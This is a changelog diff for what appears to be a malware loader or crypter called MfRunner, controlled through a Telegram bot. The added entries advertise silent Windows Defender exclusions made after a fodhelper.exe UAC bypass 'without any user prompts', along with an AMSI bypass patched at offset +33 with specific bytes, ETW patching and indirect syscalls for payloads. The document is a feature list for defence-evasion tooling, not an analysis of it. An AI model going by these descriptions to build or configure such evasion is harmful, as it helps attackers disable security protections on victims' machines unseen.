@@ -2,6 +2,30 @@
 
 ## [Unreleased] - 2025-11-03
 
+### Added - Windows Defender Exclusion (?? NEW!)
+
+#### ??? Silent Windows Defender Evasion
+- **Defender Exclusion Module**: Automatically adds executable to Windows Defender exclusions
+- **Silent Mode**: When combined with UAC bypass, adds exclusions completely silently!
+- **No User Interaction**: No prompts, no windows, completely transparent
+- **Dual Exclusions**: Adds both path and process exclusions
+- **Graceful Failure**: Silently continues if exclusion fails (no crashes)
+
+**How it works:**
+1. UAC bypass elevates to admin (silent via fodhelper.exe)
+2. Defender exclusion adds via PowerShell cmdlets
+3. Target is now excluded from Windows Defender scanning
+4. All without any user prompts or visible windows!
+
+**Configuration:**
+- CLI: Set `"defender_exclusion": true` in build.json
+- Bot: Toggle option #7 in configuration menu
+- Bot shows "?? (Silent with UAC!)" when both UAC and Defender exclusion are enabled
+
+**Files added:**
+- `MfRunner/Utilities/DefenderExclusion.cs` - Main implementation
+- `DEFENDER_EXCLUSION_INFO.md` - Comprehensive documentation
+
 ### Added - Telegram Bot Interface
 
 #### ?? Full Telegram Bot Implementation
@@ -46,9 +70,12 @@
 - `DEPENDENCIES.md` - System dependency installation guide
 - `.gitignore` - Protect sensitive files (.env, build artifacts)
 
-### Changed - Enhanced AMSI Bypass
+### Changed - Enhanced AMSI Bypass (.NET Only!)
 
 #### ??? AMSI Bypass Improvements in `MfRunner/Patches/PatchAMSI.cs`
+
+**Important Note**: AMSI and ETW patches are **ONLY applied for .NET payloads**. Native payloads use indirect syscalls and don't need these patches. This is now clearly documented in the code.
+
 - **New Technique**: Patch at offset +33 instead of function prologue
 - **Stealth**: Uses `xor rbx, rbx` (3 bytes: 72, 49, 219) instead of longer patch
 - **Memory Protection**: Properly restores PAGE_EXECUTE_READ after patching
@@ -172,7 +199,20 @@ New security considerations with bot:
 - Consider restricting to specific Telegram user IDs
 - Be aware of legal implications
 
+### Author
+
+**Developed by Florin**
+
+Special features implemented:
+- Enhanced AMSI bypass with offset +33 patching
+- Windows Defender silent exclusions
+- UAC bypass integration (fodhelper.exe technique)
+- Telegram bot interface
+- Dual payload support (Native & .NET)
+
 ### Credits
 
 - AMSI Bypass technique based on: https://github.com/Chainski/GlobalAMSIBypass
 - Telegram bot framework: https://github.com/teloxide/teloxide
+- UAC bypass: fodhelper.exe technique
+- Special thanks to the security research community
